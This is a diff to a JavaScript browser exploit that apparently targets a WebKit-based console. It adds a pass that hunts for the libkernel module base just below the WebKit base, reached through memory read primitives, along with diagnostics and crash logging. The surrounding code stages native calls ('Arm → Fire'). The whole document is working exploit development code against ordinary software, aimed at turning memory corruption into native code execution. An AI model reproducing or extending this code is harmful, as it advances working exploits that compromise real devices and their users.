@@ -48,12 +48,14 @@ import {
     extPtrToLkCandidates,
     plausibleHeapCell,
     resolveExtModuleHunt,
+    resolveExtModuleHuntDiag,
+    huntLibkernelBelowWebkit,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831w";
+const BUILD_ID = "rw-20250831x";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -2029,9 +2031,51 @@ function runVerifyLk() {
     }
 
     try {
+        const pass = verifyPassIdx % 3;
+        verifyPassIdx++;
+
+        if (pass === 2) {
+            if (!webkitBase) {
+                mark("LK-SKIP", "below-wk — no webkitBase");
+                renderOut();
+                return;
+            }
+            const wbKey = String(webkitBase);
+            if (belowWkBaseKey !== wbKey) {
+                belowWkBaseKey = wbKey;
+                belowWkOffset = 0;
+            }
+            mark("LK-BELOW-WK", "offset=" + belowWkOffset + " pages=8");
+            const below = huntLibkernelBelowWebkit(p, webkitBase, off, belowWkOffset, 8);
+            belowWkOffset += 8;
+            if (belowWkOffset >= 160) belowWkOffset = 0;
+
+            if (below && below.lk) {
+                saveLibkernelSession(below.lk, null);
+                if (addrIn) addrIn.value = String(below.lk);
+                mark("LK-RESOLVE-OK", "below-wk → " + below.lk + " via " + below.via
+                    + " stubs=" + below.stubs + " off=" + below.offset);
+                mark("LK-VERIFY-WARN", String(below.lk) + " — Force lk → Arm → Fire");
+                state("below-wk hit — Force lk → Arm", "warn");
+                renderOut();
+                crashLog.append("VERIFY below-wk " + below.lk, "LK-VERIFY");
+                crashLog.flushSync();
+                return;
+            }
+
+            mark("LK-RESOLVE-MISS", "below-wk off=" + (below.offset != null ? below.offset : belowWkOffset)
+                + " bestStubs=" + (below.bestStubs != null ? below.bestStubs : 0)
+                + " — ext ptrs are not libkernel");
+            state("below-wk miss — tap Verify (cycles below/ext)", "bad");
+            renderOut();
+            crashLog.append("VERIFY FAIL below-wk off=" + belowWkOffset, "LK-VERIFY");
+            crashLog.flushSync();
+            return;
+        }
+
         const passNames = ["mod12", "mod16"];
         const passPages = [12, 16];
-        const pass = extResolveIdx % passNames.length;
+        const pi = pass;
         const isAlignedBase = (ptr.low & 0x3fff) === 0;
 
         if (isAlignedBase) {
@@ -2054,10 +2098,11 @@ function runVerifyLk() {
                 return;
             }
         } else {
-            mark("LK-EXT-FN", hex + " import — " + passNames[pass]);
+            mark("LK-EXT-FN", hex + " — " + passNames[pi] + " (WebCore import, not lk base)");
         }
 
-        const resolved = resolveExtModuleHunt(p, ptr, webkitBase, off, passPages[pass]);
+        const diag = resolveExtModuleHuntDiag(p, ptr, webkitBase, off, passPages[pi]);
+        const resolved = diag.hit;
         if (resolved) {
             saveLibkernelSession(resolved.lk, resolved.iatRva);
             if (addrIn) addrIn.value = String(resolved.lk);
@@ -2077,11 +2122,14 @@ function runVerifyLk() {
             return;
         }
 
-        mark("LK-RESOLVE-MISS", hex + " pass=" + passNames[pass]);
+        const hdrNote = diag.hdr ? (" hdr=1 stubs=" + (diag.stubs != null ? diag.stubs : "?"))
+            : (" hdr=0 walked=" + (diag.walked != null ? diag.walked : "?"));
+        mark("LK-RESOLVE-MISS", hex + " pass=" + passNames[pi] + hdrNote);
         cycleExtPtrInHex();
-        state("verify miss — tap again", "bad");
+        mark("LK-HINT", "every 3rd Verify = below-wk (libkernel under webkit)");
+        state("ext miss — tap Verify for below-wk", "bad");
         renderOut();
-        crashLog.append("VERIFY FAIL " + hex + " " + passNames[pass], "LK-VERIFY");
+        crashLog.append("VERIFY FAIL " + hex + " " + passNames[pi] + hdrNote, "LK-VERIFY");
         crashLog.flushSync();
     } catch (err) {
         mark("LK-VERIFY-ERR", err.message || String(err));
@@ -2092,6 +2140,9 @@ function runVerifyLk() {
 }
 
 let extResolveIdx = 0;
+let verifyPassIdx = 0;
+let belowWkOffset = 0;
+let belowWkBaseKey = "";
 
 function loadExtPtrAt(idx) {
     try {
@@ -2197,7 +2248,7 @@ function finishFindLkChunk(chunk) {
             crashLog.flushSync();
 
             if (addrIn && hexes[0]) addrIn.value = hexes[0];
-            mark("LK-HINT", "Verify lk — mod12/mod16 per ext ptr (manual)");
+            mark("LK-HINT", "Verify lk: mod12/mod16 on ext ptrs, every 3rd = below-wk");
             mark("LK-MISS", "ext saved — zero finish reads build=" + BUILD_ID);
         } else if (chunk.cells === 0) {
             mark("LK-HINT", "no cells — re-run Start");
